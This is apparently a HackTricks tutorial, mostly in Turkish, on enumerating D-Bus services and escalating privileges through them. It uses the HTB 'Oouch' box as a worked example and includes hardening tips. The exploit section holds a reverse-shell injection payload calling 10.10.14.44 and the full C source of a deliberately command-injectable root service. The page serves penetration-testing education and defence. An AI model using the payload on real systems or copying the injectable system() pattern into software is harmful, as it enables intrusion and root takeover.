# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus, Ubuntu desktop ortamlarında inter-process communications (IPC) aracısı olarak kullanılır. Ubuntu'da birden fazla message bus'ın eşzamanlı olarak çalıştığı görülür: başlıca **sistem genelinde geçerli servisleri kullanıma sunmak için privileged services tarafından kullanılan system bus** ve yalnızca ilgili kullanıcıya özel servisleri kullanıma sunan, oturum açmış her kullanıcı için bir session bus. Buradaki odak, daha yüksek yetkilerle (ör. root) çalışan servislerle ilişkili olması nedeniyle öncelikle system bus üzerindedir; amacımız privilege escalation gerçekleştirmektir. D-Bus mimarisinin her session bus için bir 'router' kullandığı; bu router'ın, client'ların iletişim kurmak istedikleri servis için belirttiği adrese göre client mesajlarını uygun servislere yönlendirmekten sorumlu olduğu belirtilmelidir.

D-Bus üzerindeki servisler, sundukları **objects** ve **interfaces** tarafından tanımlanır. Objects, standart OOP dillerindeki class instance'larına benzetilebilir ve her instance benzersiz şekilde bir **object path** ile tanımlanır. Bir filesystem path'ine benzeyen bu path, servis tarafından sunulan her object'i benzersiz şekilde tanımlar. Araştırma açısından önemli bir interface, tek bir method olan Introspect'i içeren **org.freedesktop.DBus.Introspectable** interface'idir. Bu method, object'in desteklediği methods, signals ve properties'in XML gösterimini döndürür; burada properties ve signals göz ardı edilerek methods'a odaklanılmaktadır.

D-Bus interface'iyle iletişim kurmak için iki tool kullanıldı: script'lerde D-Bus tarafından sunulan methods'ların kolayca çağrılmasını sağlayan **gdbus** adlı bir CLI tool ve her bus üzerinde kullanılabilen servisleri enumerate etmek ve her servis içinde bulunan objects'leri görüntülemek üzere tasarlanmış, Python tabanlı bir GUI tool olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
```bash
sudo apt-get install d-feet
```
**session bus** kontrol ediyorsanız, önce mevcut adresi doğrulayın:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

İlk görselde, D-Bus system bus ile kayıtlı service'ler gösterilmektedir. System Bus düğmesi seçildikten sonra özellikle **org.debin.apt** vurgulanmıştır. D-Feet bu service'i object'ler için sorgular ve ikinci görselde görüldüğü üzere seçilen object'lere ait interface'leri, method'ları, property'leri ve signal'ları görüntüler. Her method'un signature'ı da ayrıntılı olarak gösterilir.

Dikkat çeken bir özellik, service'in **process ID'sinin (pid)** ve **command line'ının** görüntülenmesidir. Bu bilgiler, service'in elevated privileges ile çalışıp çalışmadığını doğrulamak için kullanışlıdır ve araştırmanın ilgili olması açısından önemlidir.

**D-Feet ayrıca method invocation'a da izin verir**: kullanıcılar parametre olarak Python expression'ları girebilir; D-Feet bunları service'e göndermeden önce D-Bus type'larına dönüştürür.

Ancak bazı method'ların invocation işlemine izin vermeden önce authentication gerektirdiğini unutmayın. İlk etapta amacımız credentials olmadan privileges yükseltmek olduğundan bu method'ları göz ardı edeceğiz.

Ayrıca bazı service'lerin, bir kullanıcının belirli action'ları gerçekleştirmesine izin verilip verilmeyeceğini öğrenmek için org.freedeskto.PolicyKit1 adlı başka bir D-Bus service'ini sorguladığını unutmayın.

## **Cmd line Enumeration**

### Service Object'lerini Listeleme

Açılmış D-Bus interface'lerini şu şekilde listelemek mümkündür:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** olarak işaretlenmiş Services özellikle ilgi çekicidir; çünkü **henüz çalışmıyorlardır**, ancak bir bus request bunları gerektiğinde başlatabilir. `busctl list` ile yetinmeyin; bu adları çalıştıracakları gerçek binary'lerle eşleştirin.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Bu, bir activatable name için hangi `Exec=` path’inin başlatılacağını ve bunun hangi identity altında çalışacağını hızlıca gösterir. Binary veya onun execution chain’i yeterince korunmuyorsa, inactive bir service yine de privilege-escalation path’i hâline gelebilir.

#### Connections

[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir process bir bus’a connection kurduğunda, bus bu connection’a _unique connection name_ adı verilen özel bir bus name atar. Bu tür bus name’leri değiştirilemezdir—connection var olduğu sürece değişmeyecekleri garanti edilir—and daha da önemlisi, bus’ın ömrü boyunca yeniden kullanılamazlar. Bu, aynı process bus’a olan connection’ı kapatıp yeni bir connection oluştursa bile, o bus’a bağlı başka hiçbir connection’ın bu unique connection name’i alamayacağı anlamına gelir. Unique connection name’ler kolayca tanınabilir; çünkü aksi takdirde yasak olan colon karakteriyle başlarlar.

### Service Object Bilgileri

Ardından, interface hakkında şu komutla bazı bilgiler elde edebilirsiniz:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Ayrıca bus adını ilgili `systemd` unit'i ve çalıştırılabilir dosya yoluyla ilişkilendirin:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Bu, privesc sırasında önemli olan operasyonel soruyu yanıtlar: **bir method call başarılı olursa, eylemi hangi gerçek binary ve unit gerçekleştirecek?**

### Bir Service Object'in Interface'lerini Listeleme

Yeterli izinlere sahip olmanız gerekir.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Bir Service Object'in Introspect Interface'i

Bu örnekte, `tree` parametresi kullanılarak keşfedilen en güncel interface'in seçildiğine dikkat edin (_önceki bölüme bakın_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
İlgilendiğimiz `htb.oouch.Block` interface’inin `.Block` method’una dikkat edin. Diğer sütunlardaki “s” harfi, bir string beklendiği anlamına gelebilir.

Tehlikeli bir şey denemeden önce, **okuma odaklı** veya başka şekilde düşük riskli bir method’u doğrulayın. Bu, üç durumu net biçimde birbirinden ayırır: yanlış syntax, erişilebilir ancak reddedilmiş veya erişilebilir ve izin verilmiş.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods ile Policies ve Actions'ı İlişkilendirme

Introspection size **neyi** çağırabileceğinizi söyler, ancak bir çağrının **neden** izin verildiğini veya reddedildiğini söylemez. Gerçek privesc triage için genellikle **üç katmanı birlikte** incelemeniz gerekir:

1. **Activation metadata** (`.service` dosyaları veya `SystemdService=`): Gerçekte hangi binary'nin ve unit'in çalıştırılacağını öğrenmek için.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`): Kimlerin `own`, `send_destination` veya `receive_sender` kullanabileceğini öğrenmek için.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`): Varsayılan authorization modelini (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) öğrenmek için.

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Bir D-Bus method'u ile bir Polkit action'ı arasında 1:1 eşleme olduğunu varsaymayın. Aynı method, değiştirilen object'e veya runtime context'e bağlı olarak farklı bir action seçebilir. Bu nedenle pratik workflow şöyledir:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` ve ilgili `.policy` dosyalarında grep
3. `busctl call`, `gdbus call` veya `dbusmap --enable-probes --null-agent` ile düşük riskli canlı probe'lar

Proxy veya compatibility service'leri özellikle incelenmelidir. Kendi önceden oluşturulmuş bağlantısı üzerinden istekleri başka bir D-Bus service'ine ileten **root ile çalışan bir proxy**, original caller identity yeniden doğrulanmadığı sürece backend'in her isteği UID 0'dan geliyormuş gibi değerlendirmesine istemeden neden olabilir.

### İzleme/Yakalama Arayüzü

Yeterli ayrıcalıklarla (yalnızca `send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir) bir **D-Bus iletişimini izleyebilirsiniz**.

Bir **iletişimi izlemek** için **root** olmanız gerekir. Root olduğunuz hâlde sorunlarla karşılaşırsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerini kontrol edin.

> [!WARNING]
> Bir D-Bus config file'ını, **root olmayan kullanıcıların** iletişimi **sniff etmesine izin verecek** şekilde nasıl yapılandıracağınızı biliyorsanız lütfen **benimle iletişime geçin**!

İzlemenin farklı yolları:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **mesaj "**_**lalalalal**_**" yanlış iletişim yoluyla gönderilir**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sonuçları Wireshark'ın açabileceği bir **pcapng** dosyasına kaydetmek için `monitor` yerine `capture` kullanabilirsiniz:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Bus üzerinde çok fazla bilgi varsa, aşağıdaki gibi bir match rule iletin:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Birden fazla kural belirtilebilir. Bir mesaj kurallardan _herhangi biriyle_ eşleşirse mesaj yazdırılır. Örneğin:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Daha fazla bilgi için [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) üzerindeki match rule syntax bölümüne bakın.

### Daha Fazlası

`busctl` daha da fazla seçeneğe sahiptir; [**tümünü burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Zafiyet İçeren Senaryo**

HTB'deki "oouch" hostu içinde **qtc kullanıcısı** olarak _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda **beklenmeyen bir D-Bus config dosyası** bulabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Önceki yapılandırmadan, bu D-BUS iletişimi üzerinden bilgi gönderip almak için **`root` veya `www-data` kullanıcısı olmanız gerektiğini** unutmayın.

Docker container içinde **qtc** kullanıcısı olarak, _/code/oouch/routes.py_ dosyasında dbus ile ilgili bazı kodlar bulabilirsiniz. İlgi çekici kod şu:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Gördüğünüz gibi, **bir D-Bus interface'ine bağlanıyor** ve **"Block" function'ına** "client_ip" değerini gönderiyor.

D-Bus bağlantısının diğer tarafında çalışan bir C compiled binary bulunuyor. Bu code, D-Bus connection üzerinde **IP address dinliyor ve verilen IP address'i block etmek için `system` function'ı aracılığıyla iptables'ı çağırıyor**.\
**`system` çağrısı command injection'a karşı kasıtlı olarak vulnerable**, bu nedenle aşağıdaki gibi bir payload reverse shell oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Bu sayfanın sonunda **D-Bus application'ın complete C code'unu** bulabilirsiniz. İçerisinde, 91-97. satırlar arasında **`D-Bus object path`** ve **`interface name`**'in nasıl **registered edildiğini** görebilirsiniz. Bu information, D-Bus connection'a information göndermek için gerekli olacaktır:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ayrıca 57. satırda, bu D-Bus iletişimi için **kayıtlı tek methodun** `Block`(_**Bu nedenle aşağıdaki bölümde payload'lar service object `htb.oouch.Block`, interface `/htb/oouch/Block` ve method name `Block`'a gönderilecek**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Aşağıdaki python kodu, payload'ı `block_iface.Block(runme)` aracılığıyla D-Bus bağlantısındaki `Block` methoduna gönderecektir (_önceki kod parçasından çıkarıldığına dikkat edin_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ve dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send`, “Message Bus”a mesaj göndermek için kullanılan bir araçtır.
- Message Bus – Sistemler tarafından uygulamalar arasındaki iletişimi kolaylaştırmak için kullanılan bir yazılımdır. Message Queue ile ilişkilidir (mesajlar sıralı olarak düzenlenir), ancak Message Bus’ta mesajlar subscription modeliyle ve oldukça hızlı bir şekilde gönderilir.
- “-system” tag’i bunun varsayılan olarak bir session mesajı değil, system mesajı olduğunu belirtmek için kullanılır.
- “–print-reply” tag’i mesajımızı uygun şekilde yazdırmak ve yanıtları insan tarafından okunabilir bir formatta almak için kullanılır.
- “–dest=Dbus-Interface-Block” Dbus interface adresidir.
- “–string:” – Interface’e göndermek istediğimiz mesajın türüdür. double, bytes, booleans, int ve objpath gibi çeşitli mesaj gönderme formatları vardır. Bunlar arasından “object path”, bir dosyanın path’ini Dbus interface’e göndermek istediğimizde kullanışlıdır. Bu durumda interface’e bir komut iletmek için dosya adı olarak özel bir dosya (FIFO) kullanabiliriz. “string:;” – FIFO reverse shell dosyasını/komutunu yerleştirdiğimiz object path’i tekrar çağırmak içindir.

_`htb.oouch.Block.Block` içinde ilk kısım (`htb.oouch.Block`) service object’i, son kısım (`.Block`) ise method name’i belirtir._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Büyük bir D-Bus attack surface'ini `busctl`/`gdbus` ile manuel olarak enumerate etmek kısa sürede zahmetli hâle gelir. Son birkaç yılda yayımlanan iki küçük FOSS utility, red-team veya CTF çalışmalarında süreci hızlandırabilir:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C ile yazılmıştır; her object path'i gezen, `Introspect` XML'ini alan ve bunu owner PID/UID ile eşleyen tek bir static binary'dir (<50 kB).
* Kullanışlı flag'ler:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool, korumasız well-known name'leri `!` ile işaretler; böylece *own* edebileceğiniz (take over) service'leri veya unprivileged shell'den erişilebilen method call'larını anında ortaya çıkarır.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Systemd unit'lerinde **writable** path'leri ve aşırı permissive D-Bus policy file'larını (ör. `send_destination="*"`) arayan yalnızca Python ile yazılmış bir script'tir.
* Hızlı kullanım:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module'ü aşağıdaki directory'leri tarar ve normal bir user tarafından spoof edilebilecek veya hijack edilebilecek service'leri öne çıkarır:
* `/etc/dbus-1/system.d/` ve `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Dikkate Değer D-Bus Privilege-Escalation Bug'ları (2024-2025)

Yakın zamanda yayımlanan CVE'leri takip etmek, custom code'daki benzer insecure pattern'leri fark etmeye yardımcı olur. Yakın döneme ait iki iyi örnek:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Root olarak çalışan service, unprivileged user'ların yeniden yapılandırabileceği bir D-Bus interface'i açığa çıkardı; buna attacker-controlled macro behavior yükleme de dahildi. | Bir daemon system bus üzerinde **device/profile/config management** açığa çıkarıyorsa, writable configuration ve macro feature'larını yalnızca "settings" olarak değil, code-execution primitive'leri olarak değerlendirin. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Root olarak çalışan bir compatibility proxy, request'leri original caller'ın security context'ini korumadan backend service'lere yönlendirdi; bu nedenle backend'ler proxy'ye UID 0 olarak güvendi. | **Proxy / bridge / compatibility** D-Bus service'lerini ayrı bir bug class olarak değerlendirin: Privileged call'ları relay ediyorlarsa caller UID/Polkit context'inin backend'e nasıl ulaştığını doğrulayın. |

Dikkat edilmesi gereken pattern'ler:
1. Service, **system bus üzerinde root olarak** çalışır.
2. Ya **authorization check yoktur** ya da check **yanlış subject** üzerinde gerçekleştirilir.
3. Erişilebilen method sonunda system state'i değiştirir: package install, user/group değişiklikleri, bootloader config, device profile updates, file writes veya doğrudan command execution.

Bir method'a erişilip erişilemediğini doğrulamak için `dbusmap --enable-probes` veya manuel `busctl call` kullanın; ardından hangi **subject**'in gerçekten authorize edildiğini anlamak için service'in policy XML'ini ve Polkit action'larını inceleyin.

---

## Hardening & Detection Quick-Wins

* World-writable veya *send/receive*-open policy'leri arayın:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dangerous method'lar için Polkit gerektirin – *root* proxy'ler bile kendi PID'leri yerine *caller* PID'sini `polkit_authority_check_authorization_sync()` fonksiyonuna geçirmelidir.
* Long-running helper'larda privilege'ları düşürün (bus'a bağlandıktan sonra namespace'leri değiştirmek için `sd_pid_get_owner_uid()` kullanın).
* Bir service'i kaldıramıyorsanız en azından onu özel bir Unix group ile *scope* edin ve XML policy'sinde erişimi kısıtlayın.
* Blue-team: anomaly detection için system bus'ı `busctl capture > /var/log/dbus_$(date +%F).pcapng` ile yakalayın ve Wireshark'a aktarın.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
